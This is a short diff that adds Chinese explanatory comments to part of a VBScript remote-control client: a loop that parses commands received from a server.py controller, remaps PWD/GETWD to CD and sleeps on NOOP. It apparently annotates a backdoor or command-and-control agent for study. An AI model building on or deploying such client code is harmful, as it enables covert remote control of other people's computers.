@@ -62,20 +62,26 @@ While True
     arrResponseText = Split(strRawCommand, " ", 2)
     strCommand = arrResponseText(0)
     strArgument = ""
+    ' UBound函数用于返回数组大小，就是验证一下是否为空，如果有命令正确传送的话，这个值应该是2
     If UBound(arrResponseText) > 0 Then
+        ' 第二部分的作用根据第一部分的指令确定
         strArgument = arrResponseText(1)
     End If
 
     ' Fix ups
+    ' 因为这两条命令是不需要参数的，所以需要重新修改一下指令，并把参数置空
     If strCommand = "PWD" Or strCommand = "GETWD" Then
         strCommand = "CD"
         strArgument = ""
     End If
 
     ' Execute command
+    ' Select Case就是其他高级语言中的switch
     Select Case strCommand
         ' Sleep X seconds
+        ' 这个NOOP字符串是server.py在没有命令发送时自动发送的一个字符串，表示当期没有命令，所以当客户端的vbs接收到该字符串之后，只需要睡眠5s，然后再继续循环即可
         Case "NOOP"
+            ' 默认是睡眠5s
             WScript.Sleep intSleep
         
         ' Get host info
